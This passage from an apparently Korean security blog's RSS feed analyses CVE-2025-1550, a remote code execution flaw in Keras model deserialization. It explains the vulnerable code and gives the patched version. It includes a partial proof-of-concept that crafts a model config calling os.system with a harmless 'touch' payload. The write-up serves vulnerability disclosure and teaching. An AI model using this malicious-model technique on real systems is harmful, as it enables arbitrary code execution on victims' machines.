&#xB85C;&#xB4DC;&#xD560; &#xACBD;&#xC6B0; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># keras/keras/saving/serialization_lib.py</span><span class="hljs-keyword">if</span> class_name == <span class="hljs-string">&quot;function&quot;</span>:        fn_name = inner_config        <span class="hljs-keyword">return</span> _retrieve_class_or_fn(            fn_name,            registered_name,            module,            obj_type=<span class="hljs-string">&quot;function&quot;</span>,            full_config=config,            custom_objects=custom_objects,        )</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBAA8;&#xB378; &#xC544;&#xD0A4;&#xD14D;&#xCCD0; &#xBC0F; &#xAD6C;&#xC131; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; <code>config.json</code> &#xD30C;&#xC77C;&#xC744; &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4;&#xB85C; &#xBC18;&#xD658;&#xD560; &#xB54C;<code>class_name</code> &#xAC12;&#xC774; <code>function</code> &#xC778; &#xACBD;&#xC6B0; <code>_retrieve_class_or_fn</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; json &#xB0B4; &#xC815;&#xC758;&#xD55C; &#xBAA8;&#xB4C8; &#xBC0F; &#xD568;&#xC218;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xBA70; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># keras/keras/saving/serialization_lib.py</span><span class="hljs-keyword">try</span>:    mod = importlib.import_module(module)    <span class="hljs-keyword">except</span> ModuleNotFoundError:        <span class="hljs-keyword">raise</span> TypeError(            <span class="hljs-string">f&quot;Could not deserialize <span class="hljs-subst">{obj_type}</span> &apos;<span class="hljs-subst">{name}</span>&apos; because &quot;</span>            <span class="hljs-string">f&quot;its parent module <span class="hljs-subst">{module}</span> cannot be imported. &quot;</span>            <span class="hljs-string">f&quot;Full object config: <span class="hljs-subst">{full_config}</span>&quot;</span>        )        obj = vars(mod).get(name, <span class="hljs-literal">None</span>)        <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:            <span class="hljs-comment"># Special case for keras.metrics.metrics</span>            <span class="hljs-keyword">if</span> registered_name <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:                obj = vars(mod).get(registered_name, <span class="hljs-literal">None</span>)            <span class="hljs-comment"># Support for `__qualname__`</span>            <span class="hljs-keyword">if</span> name.count(<span class="hljs-string">&quot;.&quot;</span>) == <span class="hljs-number">1</span>:                outer_name, inner_name = name.split(<span class="hljs-string">&quot;.&quot;</span>)                outer_obj = vars(mod).get(outer_name, <span class="hljs-literal">None</span>)                obj = (                    getattr(outer_obj, inner_name, <span class="hljs-literal">None</span>)                    <span class="hljs-keyword">if</span> outer_obj <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>                    <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>                )        <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:            <span class="hljs-keyword">return</span> obj</code></pre><p>&#xC774;&#xB54C; &#xBCC4;&#xB3C4;&#xC758; &#xAC80;&#xC99D;&#xC5C6;&#xC774; &#xBAA8;&#xB4C8; &#xBC0F; &#xD568;&#xC218;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. Keras&#xB294; &#xBAA8;&#xB378; &#xD30C;&#xC77C;&#xC744; &#xC784;&#xC2DC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC704;&#xCE58;&#xC2DC;&#xD0A4;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC545;&#xC131; lib&#xC774;&#xB098; python script&#xB294; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC;, <code>os.system()</code> &#xAC19;&#xC740; &#xD45C;&#xC900; &#xBAA8;&#xB4C8;&#xC744; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="hljs python">...PAYLOAD = <span class="hljs-string">&quot;touch /tmp/pwned_by_keras&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_malicious_config</span>():</span>    <span class="hljs-keyword">return</span> {        <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;Functional&quot;</span>,        <span class="hljs-string">&quot;config&quot;</span>: {            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;pwned_model&quot;</span>,            <span class="hljs-string">&quot;layers&quot;</span>: [                {                    <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;Lambda&quot;</span>,                    <span class="hljs-string">&quot;config&quot;</span>: {                        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;evil_lambda&quot;</span>,                        <span class="hljs-string">&quot;function&quot;</span>: {                            <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,                            <span class="hljs-string">&quot;config&quot;</span>: {                                <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;os&quot;</span>,                                <span class="hljs-string">&quot;function_name&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>,                                <span class="hljs-string">&quot;registered_name&quot;</span>: <span class="hljs-literal">None</span>                            }                        },                        <span class="hljs-string">&quot;arguments&quot;</span>: [PAYLOAD]                    }                }            ],            <span class="hljs-string">&quot;input_layers&quot;</span>: [[<span class="hljs-string">&quot;evil_lambda&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]],            <span class="hljs-string">&quot;output_layers&quot;</span>: [[<span class="hljs-string">&quot;evil_lambda&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]        }    }...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trigger_exploit</span>(<span class="hljs-params">model_path</span>):</span>    print(<span class="hljs-string">&quot;[*] Loading malicious model to trigger exploit...&quot;</span>)    load_model(model_path)    print(<span class="hljs-string">&quot;[&#x2713;] Model loaded. If vulnerable, payload should be executed.&quot;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    keras_file = <span class="hljs-string">&quot;malicious_model.keras&quot;</span>    build_malicious_keras(keras_file)    trigger_exploit(keras_file)</code></pre><p><code>create_malicious_config()</code> &#xD568;&#xC218;&#xB294; &#xBAA8;&#xB378; &#xAD6C;&#xC870;&#xB97C; &#xC815;&#xC758;&#xD558;&#xB294; config.json &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. <code>class_name</code>&#xC744; <code>&quot;function&quot;</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0;, <code>module</code>&#xACFC; <code>function_name</code>&#xC744; &#xAC01;&#xAC01; <code>&quot;os&quot;</code>&#xC640; <code>&quot;system&quot;</code>&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xD568;&#xC73C;&#xB85C;&#xC368;, Keras &#xB0B4;&#xBD80;&#xC758; <code>deserialize_keras_object()</code> &#x2192; <code>_retrieve_class_or_fn()</code> &#xB97C; &#xD1B5;&#xD574; <code>os.system</code> &#xD568;&#xC218; &#xAC1D;&#xCCB4;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.<br><code>arguments</code> &#xD544;&#xB4DC;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>&quot;touch /tmp/pwned_by_keras&quot;</code>&#xBB38;&#xC790;&#xC5F4; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD568;&#xC73C;&#xB85C;&#xC368;, &#xBAA8;&#xB378;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC5D0; <code>os.system(&quot;touch /tmp/pwned_by_keras&quot;)</code> &#xD615;&#xD0DC;&#xB85C; &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Patched-Code"><a href="#Patched-Code" class="headerlink" title="Patched Code"></a>Patched Code</h2><pre><code class="hljs python"><span class="hljs-comment"># Otherwise, attempt to retrieve the class object given the `module`</span><span class="hljs-comment"># and `class_name`. Import the module, find the class.</span>package = module.split(<span class="hljs-string">&quot;.&quot;</span>, maxsplit=<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<span class="hljs-keyword">if</span> package <span class="hljs-keyword">in</span> {<span class="hljs-string">&quot;keras&quot;</span>, <span class="hljs-string">&quot;keras_hub&quot;</span>, <span class="hljs-string">&quot;keras_cv&quot;</span>, <span class="hljs-string">&quot;keras_nlp&quot;</span>}:    <span class="hljs-keyword">try</span>:        mod = importlib.import_module(module)        obj = vars(mod).get(name, <span class="hljs-literal">None</span>)        <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:            <span class="hljs-keyword">return</span> obj    <span class="hljs-keyword">except</span> ModuleNotFoundError:        <span class="hljs-keyword">raise</span> TypeError(            <span class="hljs-string">f&quot;Could not deserialize <span class="hljs-subst">{obj_type}</span> &apos;<span class="hljs-subst">{name}</span>&apos; because &quot;</span>            <span class="hljs-string">f&quot;its parent module <span class="hljs-subst">{module}</span> cannot be imported. &quot;</span>            <span class="hljs-string">f&quot;Full object config: <span class="hljs-subst">{full_config}</span>&quot;</span>        )</code></pre><p>&#xD604;&#xC7AC; keras v3.9 &#xC5D0;&#xC11C;&#xB294; function&#xACFC; &#xAC19;&#xC740; &#xB808;&#xC774;&#xC5B4;&#xAC00; &#xC544;&#xB2CC; &#xAC1D;&#xCCB4;&#xB4E4;&#xC774; &#xB808;&#xC774;&#xC5B4;&#xB85C; &#xB4F1;&#xB85D;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xACE0; &#xB85C;&#xB4DC;&#xB420; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4C8;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/keras-team/keras/compare/v3.8.0...v3.9.0#diff-a6f943afa29bfbaa617e01980fe425cb044c203fec911c91dd49014ca03149d6R782-R787">https://github.com/keras-team/keras/compare/v3.8.0...v3.9.0#diff-a6f943afa29bfbaa617e01980fe425cb044c203fec911c91dd49014ca03149d6R782-R787</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/Keras/">Keras</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-1550/">CVE-2025-1550</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/26/poosic/cve-2025-1550/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
